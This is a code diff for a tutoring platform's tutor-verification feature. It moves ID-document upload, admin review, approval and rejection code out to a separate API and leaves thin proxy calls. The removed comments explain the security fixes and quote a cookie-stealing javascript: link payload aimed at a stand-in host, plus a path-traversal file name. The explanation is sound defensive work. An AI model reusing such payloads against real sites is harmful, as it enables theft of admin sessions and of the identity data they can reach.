@@ -1,11 +1,5 @@
 "use server";
-import { eq, and, or, ne, sql, desc, ilike, inArray, isNull } from "@tnajem/db";
-import { db, dbReady } from "@/lib/db";
-import {
-  profiles, tutors, classes, packs, bookings, consents, verificationDocs, reviews, notifications,
-} from "@tnajem/db";
-import { writeFile, mkdir } from "node:fs/promises";
-import { join } from "node:path";
+import { dbReady } from "@/lib/db";
 import {
   normalizePhone, isValidPhone, createOtp, verifyOtpCode, otpCooldownRemaining,
   createSession, destroySession, getSession, setDemoCookie, checkRateLimit, clientIp,
@@ -13,15 +7,8 @@ import {
   OTP_RESEND_COOLDOWN_SEC, OTP_TTL_SEC, adoptSession,} from "@/lib/auth";
 import { demoClasses, demoEnabled } from "@/lib/demo";
 import { revalidateTutor, revalidatePublicTutors } from "@/lib/cache";
-import { smsEnabled, sendSms } from "@tnajem/shared/sms";
-import { mailEnabled, sendMail } from "@tnajem/shared/mail";
-/* notify now takes a db handle (it moved to @tnajem/db so apps/api can use the
-   SAME implementation). Bound here so the ~8 call sites below are unchanged. */
-import { notify as notifyWith } from "@tnajem/db";
-const notify = (profileId: string, input: Parameters<typeof notifyWith>[2]) =>
-  notifyWith(db, profileId, input);
 import { requireAdmin, adminNotifyEmails } from "@/lib/admin";
-import { call, callAnonymous } from "@/lib/api";
+import { call, callAnonymous, callMultipart } from "@/lib/api";
 import { demoFallback } from "@/lib/backend";
 import { paymentsEnabled, tutorBalanceTnd } from "@tnajem/shared/payments";
 import { liveRoomUrl, resolveMeetUrl } from "@tnajem/shared/live";
@@ -339,391 +326,66 @@ export async function getClass(id: string): Promise<ClassItem | null> {
 }
 
 /* ===================== Tutor verification =====================
-   Identity (ID) is required; diploma/experience/links are optional trust
-   boosters. On submit the tutor goes to "pending" (hidden from Explore +
-   public storefront) until an admin approves. Files are stored on local disk
-   under ./.storage (gitignored) — swap for a cloud bucket in production. */
-
-// STORAGE_DIR points at a persistent volume in prod (e.g. /var/data on Render);
-// falls back to a local ./.storage folder in dev.
-const STORAGE_BASE = process.env.STORAGE_DIR || join(process.cwd(), ".storage");
-const STORAGE_ROOT = join(STORAGE_BASE, "verification");
-const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
-const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;
-const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
-  { field: "idFront", kind: "id_front", required: true },
-  { field: "idBack", kind: "id_back" },
-  { field: "selfie", kind: "selfie" },
-  { field: "diploma", kind: "diploma" },
-  { field: "certificate", kind: "certificate" },
-  { field: "roleProof", kind: "role_proof" },
-];
-const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket
-
-/* Content sniffing. `File.type` is just the Content-Type the CLIENT put in the
-   multipart part — it is attacker-chosen and proves nothing. The OK_MIME check
-   above therefore only ever established what the uploader CLAIMED. Since the admin
-   doc route streams these bytes back with that same claimed type, "HTML file
-   labelled image/png" was a stored-XSS payload aimed at the one session that can
-   read every tutor's national ID scan.
-
-   So: verify the magic bytes. If the header doesn't match a format we accept, the
-   upload is refused — regardless of what the client called it. Cheap, dependency-free,
-   and it also stops polyglots from being written to disk in the first place. */
-function sniffMime(buf: Buffer): string | null {
-  if (buf.length < 12) return null;
-  // JPEG: FF D8 FF
-  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return "image/jpeg";
-  // PNG: 89 50 4E 47 0D 0A 1A 0A
-  if (buf.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return "image/png";
-  // PDF: %PDF-
-  if (buf.subarray(0, 5).toString("latin1") === "%PDF-") return "application/pdf";
-  // RIFF....WEBP
-  if (buf.subarray(0, 4).toString("latin1") === "RIFF" && buf.subarray(8, 12).toString("latin1") === "WEBP") {
-    return "image/webp";
-  }
-  // ISO-BMFF (HEIC/HEIF): bytes 4..8 = "ftyp", brand at 8..12
-  if (buf.subarray(4, 8).toString("latin1") === "ftyp") {
-    const brand = buf.subarray(8, 12).toString("latin1");
-    if (["heic", "heix", "hevc", "heim", "heis", "hevm", "mif1", "msf1"].includes(brand)) return "image/heic";
-  }
-  return null;
-}
-
-/* The admin gate lives in lib/admin.ts now — ONE implementation, shared with
-   app/api/admin/doc/[id]/route.ts. That route carried a phone-only copy, so
-   under email login (the default) every admin got 403 on every ID scan while
-   still being shown the queue. The fail-closed history is documented there. */
+   All of it moved to apps/api/src/routes/admin.ts: the storage paths, the size
+   and document caps, the MIME allow-list, the magic-byte sniffing and the
+   admin gate. Uploads and the admin queue moved TOGETHER because they share
+   STORAGE_DIR, the same path-containment check and the same allowlist —
+   splitting them would have shipped a document route whose gate lived in the
+   other half. */
 
 export async function submitVerification(formData: FormData):
   Promise<{ ok: boolean; demo?: boolean; error?: string; retryAfter?: number }> {
-  if (!dbReady) return { ok: true, demo: true };
-  const session = await getSession();
-  if (!session) return { ok: false, error: "not-authenticated" };
-  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
-  if (!mine) return { ok: false, error: "no-storefront" };
+  if (demoFallback) return { ok: true, demo: true };
 
-  /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
-     often you could call it: a signed-in tutor could loop this and fill the disk
-     (the same volume the app and every other tutor's documents live on). */
-  const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000); // 5 submissions / hour / tutor
-  if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };
+  /* PORTED to apps/api (POST /verification). Magic-byte sniffing, the size and
+     document caps, the rate limit, safeFileName and the URL allow-list all moved
+     with it.
 
-  /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
-     bounds the TOTAL, so a patient attacker can't drip-feed the disk full over days.
-     Rows are only ever removed by the retention purge (lib/retention.ts). */
-  const [{ n: docCount } = { n: 0 }] = await db
-    .select({ n: sql<number>`count(*)::int` })
-    .from(verificationDocs)
-    .where(eq(verificationDocs.tutorId, mine.id));
-
-  // Collect + validate files (idFront required).
-  const incoming: { kind: DocKind; file: File; bytes: Buffer; mime: string }[] = [];
-  for (const d of DOC_FIELDS) {
-    const f = formData.get(d.field);
-    if (f instanceof File && f.size > 0) {
-      // Size is checked BEFORE we read the body into memory.
-      if (f.size > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };
-      if (!OK_MIME.test(f.type)) return { ok: false, error: "bad-file-type" };
-
-      const bytes = Buffer.from(await f.arrayBuffer());
-      // Belt and braces: a lying Content-Length can't smuggle a bigger body past us.
-      if (bytes.length > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };
-
-      // The real gate: what the bytes ACTUALLY are, not what the client claimed.
-      const sniffed = sniffMime(bytes);
-      if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };
-
-      incoming.push({ kind: d.kind, file: f, bytes, mime: sniffed });
-    } else if (d.required) {
-      return { ok: false, error: "id-required" };
-    }
-  }
-
-  if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
-    return { ok: false, error: "too-many-documents" };
-  }
-
-  /* Persist. Files land under STORAGE_DIR/verification/<tutorId>/ — outside
-     /public, so nothing here is ever served statically; the only reader is the
-     admin-gated route in app/api/admin/doc/[id]. `mine.id` comes from the session's
-     own tutor row, so a tutor can only ever write into their OWN folder. */
-  const dir = join(STORAGE_ROOT, mine.id);
-  await mkdir(dir, { recursive: true });
-  for (const { kind, bytes, mime, file } of incoming) {
-    // safeFileName() strips directory components and everything outside
-    // [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to a
-    // flat, inert name. The kind + timestamp prefix keeps it unique and non-guessable-ish.
-    const safe = `${kind}-${Date.now()}-${safeFileName(file.name, 60)}`;
-    await writeFile(join(dir, safe), bytes);
-    await db.insert(verificationDocs).values({
-      tutorId: mine.id,
-      kind,
-      // Store the SANITIZED name: this string is echoed into a Content-Disposition
-      // header by the admin doc route, and the raw client name could carry CR/LF.
-      fileName: safeFileName(file.name, 60),
-      /* POSIX separators, ALWAYS. node:path.join is platform-dependent, so this
-         column filled up with "verification\<id>\<file>" on Windows and
-         "verification/<id>/<file>" on Linux — the same logical path stored two
-         ways. Both readers split on /[\/]+/ so it resolved either way, but the
-         stored value was not canonical: any future consumer that uses it verbatim
-         (a URL, a LIKE query, a join) silently misses half the rows.
-         scripts/sql/0006 normalises the rows that already exist. */
-      storagePath: ["verification", mine.id, safe].join("/"),
-      mime,                 // the SNIFFED type — never the client's claim
-      sizeBytes: bytes.length,
-    });
-  }
-
-  /* Text + link fields.
-
-     BUG (fixed): these were written straight through with a bare
-     `typeof v === "string" ? v.trim() : null` — no length bound and, more
-     importantly, NO URL VALIDATION, unlike createClass which runs vOptionalUrl on
-     meetUrl. The seven *Url fields land in the tutors row, come back out through
-     getPendingVerifications()/getMyVerification(), and are rendered as <a href> on
-     the admin review page and the tutor's own page. A tutor submitting
-     `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" was
-     therefore planting a link that fires in the ADMIN's authenticated origin — the
-     one session that can read every national ID scan in the system.
-
-     vOptionalUrl enforces an http/https scheme allow-list (lib/validation.ts), which
-     is exactly what kills javascript:, data: and file:. Text fields get bounded too. */
-  const textField = (k: string, max: number) => vOptionalText(formData.get(k), { field: k, max });
-  const urlField = (k: string) => vOptionalUrl(formData.get(k), { field: k, max: 300 });
-
-  const institution = textField("institution", 160);
-  if (!institution.ok) return { ok: false, error: institution.error };
-  const languages = textField("languages", 120);
-  if (!languages.ok) return { ok: false, error: languages.error };
-  const pitch = textField("pitch", 1000);
-  if (!pitch.ok) return { ok: false, error: pitch.error };
-
-  const linkedin = urlField("linkedinUrl");
-  if (!linkedin.ok) return { ok: false, error: linkedin.error };
-  const instagram = urlField("instagramUrl");
-  if (!instagram.ok) return { ok: false, error: instagram.error };
-  const tiktok = urlField("tiktokUrl");
-  if (!tiktok.ok) return { ok: false, error: tiktok.error };
-  const youtube = urlField("youtubeUrl");
-  if (!youtube.ok) return { ok: false, error: youtube.error };
-  const facebook = urlField("facebookUrl");
-  if (!facebook.ok) return { ok: false, error: facebook.error };
-  const website = urlField("websiteUrl");
-  if (!website.ok) return { ok: false, error: website.error };
-  const introVideo = urlField("introVideoUrl");
-  if (!introVideo.ok) return { ok: false, error: introVideo.error };
-
-  const yearsRaw = formData.get("experienceYears");
-  const years = typeof yearsRaw === "string" && yearsRaw.trim()
-    ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0)) : null;
-
-  await db.update(tutors).set({
-    status: "pending", submittedAt: new Date(), reviewNote: null,
-    experienceYears: years,
-    institution: institution.value, languages: languages.value, pitch: pitch.value,
-    linkedinUrl: linkedin.value, instagramUrl: instagram.value, tiktokUrl: tiktok.value,
-    youtubeUrl: youtube.value, facebookUrl: facebook.value, websiteUrl: website.value,
-    introVideoUrl: introVideo.value,
-  }).where(eq(tutors.id, mine.id));
-
-  /* Tell a human. Without this the queue was write-only: a tutor uploaded their
-     national ID, several screens told them someone would look at it, and no signal
-     of any kind left the database. Email rather than notify(): admins are an env
-     allowlist (ADMIN_EMAILS) and may have no profile row to notify, and a review
-     promise needs to reach them off-site rather than waiting for them to open a
-     page they have no link to.
-
-     Deliberately after the commit and deliberately not awaited into the result: the
-     tutor's submission has already succeeded, and a misconfigured mailbox must
-     never turn that into an error they cannot act on. Failures are logged loudly
-     instead — a silent alerting gap is how the 48h promise quietly stops holding. */
-  void notifyAdminsOfSubmission(mine.id, mine.slug, mine.fullName).catch(() => {});
-
-  return { ok: true };
-}
-
-
-async function notifyAdminsOfSubmission(tutorId: string, slug: string, displayName: string): Promise<void> {
-  const to = adminNotifyEmails();
-  if (!to.length) {
-    console.warn(
-      "[Tnajem] verification submitted (tutor %s) but ADMIN_EMAILS is empty — nobody was alerted. " +
-        "The review queue is at /admin/verifications.",
-      tutorId,
-    );
-    return;
-  }
-  if (!mailEnabled()) {
-    console.warn(
-      "[Tnajem] verification submitted (tutor %s) but MAIL_* is not configured — no admin alert sent.",
-      tutorId,
-    );
-    return;
-  }
-  const site = process.env.NEXT_PUBLIC_SITE_URL ?? "https://tnajem.tn";
-  const subject = `Tnajem — nouvelle demande de vérification : ${displayName}`;
-  const body =
-    `${displayName} (/${slug}) vient d'envoyer ses documents de vérification.\n\n` +
-    `File d'attente : ${site}/fr/admin/verifications\n`;
-  for (const address of to) {
-    const sent = await sendMail(address, subject, body);
-    if (!sent) console.error("[Tnajem] admin alert failed for %s (tutor %s)", address, tutorId);
-  }
+     The FormData is handed STRAIGHT to fetch — never buffered here. The action
+     already holds up to 6 x 8 MB in this process; buffering again in the proxy
+     would double peak memory on the same box for no benefit. undici sets the
+     multipart boundary itself, which is why no content-type is set: a hand-written
+     multipart header without a boundary is the classic failure here. */
+  return callMultipart<{ ok: boolean; error?: string; retryAfter?: number }>(
+    "/verification",
+    formData,
+  );
 }
 
 export async function getMyVerification(): Promise<TutorVerification | null> {
-  if (!dbReady) return null;
-  const session = await getSession();
-  if (!session) return null;
-  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
-  if (!mine) return null;
-  const docs = await db.select().from(verificationDocs).where(eq(verificationDocs.tutorId, mine.id));
-  return {
-    status: mine.status,
-    experienceYears: mine.experienceYears ?? null,
-    institution: mine.institution ?? null,
-    languages: mine.languages ?? null,
-    pitch: mine.pitch ?? null,
-    links: {
-      linkedin: mine.linkedinUrl ?? null, instagram: mine.instagramUrl ?? null, tiktok: mine.tiktokUrl ?? null,
-      youtube: mine.youtubeUrl ?? null, facebook: mine.facebookUrl ?? null, website: mine.websiteUrl ?? null,
-      introVideo: mine.introVideoUrl ?? null,
-    },
-    reviewNote: mine.reviewNote ?? null,
-    docKinds: docs.map((d) => d.kind),
-  };
+  if (demoFallback) return null;
+  // PORTED to apps/api (GET /verification/mine).
+  return call<TutorVerification | null>("/verification/mine", undefined, "GET");
 }
 
 export async function getPendingVerifications():
   Promise<{ ok: boolean; admin: boolean; items: PendingTutor[] }> {
-  const session = await requireAdmin();
-  if (!session) return { ok: false, admin: false, items: [] };
-
-  // Bounded: the review queue is a work list, not an export. Oldest submissions
-  // first so nobody's application is starved at the bottom of an unbounded scan.
-  const rows = await db
-    .select()
-    .from(tutors)
-    .where(eq(tutors.status, "pending"))
-    .orderBy(tutors.submittedAt)
-    .limit(100);
-  if (rows.length === 0) return { ok: true, admin: true, items: [] };
-
-  /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor inside the
-     loop below. At 100 pending applications that was 101 round-trips for one page
-     load. Fetch every doc for the batch in a single inArray query and group in memory. */
-  const allDocs = await db
-    .select()
-    .from(verificationDocs)
-    .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));
-
-  const docsByTutor = new Map<string, typeof allDocs>();
-  for (const d of allDocs) {
-    const list = docsByTutor.get(d.tutorId);
-    if (list) list.push(d);
-    else docsByTutor.set(d.tutorId, [d]);
-  }
-
-  const items: PendingTutor[] = [];
-  for (const t of rows) {
-    const docs = docsByTutor.get(t.id) ?? [];
-    items.push({
-      tutorId: t.id, slug: t.slug, name: t.fullName, subject: t.subject,
-      experienceYears: t.experienceYears ?? null, institution: t.institution ?? null,
-      languages: t.languages ?? null, pitch: t.pitch ?? null,
-      links: {
-        linkedin: t.linkedinUrl ?? null, instagram: t.instagramUrl ?? null, tiktok: t.tiktokUrl ?? null,
-        youtube: t.youtubeUrl ?? null, facebook: t.facebookUrl ?? null, website: t.websiteUrl ?? null,
-        introVideo: t.introVideoUrl ?? null,
-      },
-      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
-      docs: docs.map((d) => ({ id: d.id, kind: d.kind, fileName: d.fileName })),
-    });
-  }
-  return { ok: true, admin: true, items };
+  if (demoFallback) return { ok: false, admin: false, items: [] };
+  // PORTED to apps/api (GET /admin/verifications). requireAdmin lives there and
+  // fails closed on an unconfigured allowlist.
+  return call<{ ok: boolean; admin: boolean; items: PendingTutor[] }>(
+    "/admin/verifications",
+    undefined,
+    "GET",
+  );
 }
 
 export async function approveTutor(input: { tutorId: string }): Promise<{ ok: boolean; error?: string }> {
-  const session = await requireAdmin();
-  if (!session) return { ok: false, error: "forbidden" };
-  const tutorId = vUuid(input.tutorId, { field: "tutor" });
-  if (!tutorId.ok) return { ok: false, error: "not-found" };
-
-  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
-  if (!t) return { ok: false, error: "not-found" };
-
-  // Separation of duties: an admin who also runs a tutor storefront must not be
-  // able to verify their own identity documents. A second admin has to sign it off.
-  if (t.profileId && t.profileId === session.profile.id) {
-    return { ok: false, error: "self-approval-forbidden" };
-  }
-  // Only a submitted application can be approved — otherwise a draft tutor who
-  // never uploaded an ID could be waved through by a misclick.
-  if (t.status !== "pending") return { ok: false, error: "not-pending" };
-
-  await db.update(tutors)
-    .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
-    .where(eq(tutors.id, tutorId.value));
-
-  /* Make the decision effective NOW, not in up to 60s (STOREFRONT_TTL) / an hour
-     (SITEMAP_TTL). On approve this is a UX win — the tutor's page and the sitemap
-     go live the second the admin clicks. On reject (below) it is a compliance
-     control. Both helpers are non-throwing: a cache problem must never roll back
-     a decision that is already committed to the database. Done BEFORE notify(),
-     which does SMS I/O and is the slow part of this action. */
-  revalidateTutor(t.slug);
-  revalidatePublicTutors(); // the public set changed → refresh the sitemap
-
-  // The tutor was never told before — they just watched a silent page.
-  if (t.profileId) {
-    await notify(t.profileId, {
-      kind: "verification_approved",
-      title: "Profil vérifié ✅",
-      body: "Ton profil est validé. Ta page est en ligne et visible dans Explorer.",
-      href: "/dashboard",
-      sms: `Tnajem : ton profil est vérifié ✅ Ta page tnajem.tn/${t.slug} est en ligne.`,
-    });
-  }
-  return { ok: true };
+  if (demoFallback) return { ok: false, error: "forbidden" };
+  /* PORTED to apps/api (POST /admin/verifications/approve). Self-approval refusal
+     and the "must be pending" gate moved with it; call() replays the revalidate
+     envelope so the tutor's page and the sitemap go live immediately. */
+  return call<{ ok: boolean; error?: string }>("/admin/verifications/approve", input);
 }
 
 export async function rejectTutor(input: { tutorId: string; note?: string }): Promise<{ ok: boolean; error?: string }> {
-  const session = await requireAdmin();
-  if (!session) return { ok: false, error: "forbidden" };
-  const note = vOptionalText(input.note, { field: "note", max: 500 });
-  if (!note.ok) return { ok: false, error: note.error };
-  const tutorId = vUuid(input.tutorId, { field: "tutor" });
-  if (!tutorId.ok) return { ok: false, error: "not-found" };
+  if (demoFallback) return { ok: false, error: "forbidden" };
+  /* PORTED to apps/api (POST /admin/verifications/reject).
 
-  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
-  if (!t) return { ok: false, error: "not-found" };
-
-  await db.update(tutors)
-    .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
-    .where(eq(tutors.id, tutorId.value));
-
-  /* THE COMPLIANCE ONE. getStorefront() returns null for a non-verified tutor and
-     the page 404s — but app/[slug]/page.tsx is ISR-cached for 60s, so without this
-     the page of a tutor we have just REJECTED (possibly for a failed ID check, on
-     a platform used by minors) keeps being served to the public for up to another
-     minute, and the sitemap keeps advertising it for up to an hour. The TTL is the
-     backstop; this is the control. Non-throwing by design — see approveTutor. */
-  revalidateTutor(t.slug);
-  revalidatePublicTutors(); // drop them from the cached sitemap too
-
-  if (t.profileId) {
-    await notify(t.profileId, {
-      kind: "verification_rejected",
-      title: "Dossier à compléter",
-      body: note.value
-        ? `Ton dossier n'a pas été validé : ${note.value}. Tu peux corriger et renvoyer.`
-        : "Ton dossier n'a pas été validé. Vérifie tes documents et renvoie ta demande.",
-      href: "/onboarding/verify",
-      sms: "Tnajem : ton dossier de vérification doit être complété. Détails dans ton espace prof.",
-    });
-  }
-  return { ok: true };
+     The revalidation replayed by call() is a COMPLIANCE control here, not a UX
+     nicety: without it the page of a tutor we have just rejected keeps being
+     served for up to 60s and advertised in the sitemap for up to an hour. */
+  return call<{ ok: boolean; error?: string }>("/admin/verifications/reject", input);
 }
 
 /* ---------- Explore feed (real, verified tutors only) ----------
